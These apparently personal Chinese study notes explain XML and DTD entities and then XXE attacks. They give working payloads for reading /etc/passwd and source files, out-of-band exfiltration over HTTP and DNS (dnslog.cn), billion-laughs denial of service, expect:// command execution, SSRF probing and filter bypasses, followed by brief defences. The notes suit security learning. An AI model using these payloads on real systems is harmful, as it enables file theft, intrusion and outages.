## XML

> XML：可扩展标记语言。
> 和html类似，都有一个关闭标签。标签大小写敏感。
> 是一个树状结构。
> 空格会保留

```xml
<?xml version="1.0" encoding="UTF-8"?>
```



## DTD

> DTD document type declaration：文档类型声明。说明xml结构(允许出现哪些元素，属性等)
> 定义元素,属性之间的层次.

### dtd类型

分为内部声明DTD和外部引用DTD

* 内部DTD
  ```dtd
  <!DOCTYPE 根元素 [<!子元素声明>] >
  ```

  ```dtd
  <!DOCTYPE student [
	  <!ELEMENT student (name, age)> 
	  <!ELEMENT name (#PCDATA)>
	  <!ELEMENT age (#PCDATA)>
  ]>
  #student有两个子元素
  ```

* 外部DTD

  ```dtd
  <!DOCTYPE 根 SYSTEM "文件名">
  ```

  ```dtd
  <?xml version = "1.0"?>
  <!DOCTYPE root SYSTEM "./xml-dtd.dtd">
  ```

### DTD元素

> 是xml ，html 的主要元素.

```dtd
<!ELEMENT 元素名 (类型)> 
```

```dtd
<!ELEMENT note (type)>
```

根元素在<!doctype>中声明

### DTD实体

#### 自定义实体

> 就像是变量，占位符。
> DOCTYPE用于内部实体和元素声明

* 声明

```dtd
<!DOCTYPE hello
[
        <!ENTITY enty_name "value">
]>
<!--hello 有enty_name 实体，值是value-->
```

* 使用

  ```dtd
  <message>
  作者：$auther;
  </message>
  ```

  

```dtd
<!DOCTYPE hello [
  <!ENTITY author "张三">
]>
<message>
  作者：&author;
</message>
```



#### 预定义实体

| 实体引用 | 符号 |
| -------- | ---- |
| \&lt;    | <    |
| \&gt;    | >    |
| \&amp;   | &    |
| \&quot;  | "    |
| \&apos;  | '    |



#### 外部实体

> 在实体中添加SYSTEM(不是公共注册的dtd，通常使用system)，。public

```dtd
<!DOCTYPE root [
        <!ENTITY p1 SYSTEM "file:///etc/passwd">
        <!ENTITY p2 "<!ENTITY p3 SYSTEM 'http://example/xxx.php?info='"
    ]>
```

#### 参数实体

> 只能在单独的dtd文件中使用，不能在xml中。而一般实体就可以

```dtd
<!--xx.dtd:-->
引用格式 %var;
<!ENTITY % p1 "hello">
<!ENTITY % p2 "world">
<!ENTITY % p3 "%p1;%p2";> 
%p3;
```



***

## XXE 原理
外部实体注入
XML解析器根据用户输入的实体进行了不正确引用
不同解析器在处理外部DTD时，有不同的解析方法：
在 PHP 中默认处理的函数为: 
xml_parse 和 simplexml_load xml_parse 的实现方式为 expat 库，默认情况不
会解析外部实体,而 simplexml_load 默认情况下会解析外部实体,造成安全威胁.
除 PHP 外，在 Java，Python 等处理 xml 的组件及函数中都可能存在此问题
原本是：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <name>usr</name>
    <password>fs</password>
</root>
```

通过自己写一个实体,就可以读取文件(仅限有回显可见)

```dtd
<!DOCTYPE xss [
        <!ENTITY info SYSTEM "file:///etc/passwd">
    ]>
<name> &info; </name>
```

## 利用
### 文件读取

* file:///path/to/file.ext
  
* http://url/file.ext
* php://filter/read=convert.base64-encode/resource=conf.php

#### 有回显

* file://读取

  ```dtd
  <!DOCTYPE xss [
          <!ENTITY info SYSTEM "file:///etc/passwd">
      ]>
  <name> &info; </name>
  ```

* php:filter取原码

  ```dtd
  <!DOCTYPE xss [
          <!ENTITY info SYSTEM "php://filter/read=convert.base64-encode/resource=conf.php">
      ]>
  <name> &info; </name>
  ```

#### 无回显

> 通常将数据外带。

* 外带到php参数

  > &p1不能出现在url中，所以要用%p1;+dtd文件
  >
  > xml解析器不会展开url中的实体，但是会展开代码中的实体。也就是解析器看到 p2的值有<>会把他当作一个实体，会把实体中的变量实体展开。
  > 到p3时，url就没有变量实体了

  ```dtd
  xx.dtd：
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY % p2 "<!ENTITY p3 SYSTEM 'http://example.php?var=%p1;'>">
  %p2;
  ```

  

* dns外带

  ```dtd
  xx.dtd:
  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
  <!ENTITY % p2 "<!ENTITY % p3 SYSTEM '%p1;.xxx.dnslog.cn'>">
  %p3;
  ```

* nc接收
  

### dos

> 实体嵌套，解析指数级上升。

```dtd
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

### 命令执行

> 需要安装php扩展 expect

```dtd
<!ENTITY xxe SYSTEM "expect://command">
```



### ssrf

```dtd
<!ENTITY xxe SYSTEM "ip:port"> 探测内网端口
```

## 绕过

## 过滤ip
- **利用IP地址的多种表示法**：
    
    - 十进制整数：`127.0.0.1` 可表示为 `2130706433`
    - 八进制：`127.0.0.1` 可表示为 `0177.0.0.1` 或 `0177.000.000.001`
    - 十六进制：`127.0.0.1` 可表示为 `0x7f.0.0.1`
    - 省略前导零或使用IPv6兼容格式：`::1` 或 `::127.0.0.1`
- **利用解析差异**：后端用正则匹配，但底层库（如 `inet_pton`）解析时却支持上述格式，造成“检查通过”但“实际解析到内网”的情况
- 
## 编码绕过
* base64
```xml
<!ENTITY xxe SYSTEM "data:text/plain;base64,ZmlyZWZveDovL2V0Yy9wYXNzd2Q=">
```
* url编码
```
 <!ENTITY xxe SYSTEM "file://%2Fetc%2Fpasswd"> 
```
## 协议绕过
会过滤http，file等协议，使用其他协议
```
 <!ENTITY xxe SYSTEM "php://filter/resource=/etc/passwd"> 
```
## 防御
1. 对实体访问进行限制
2. 使用不加载外部实体的函数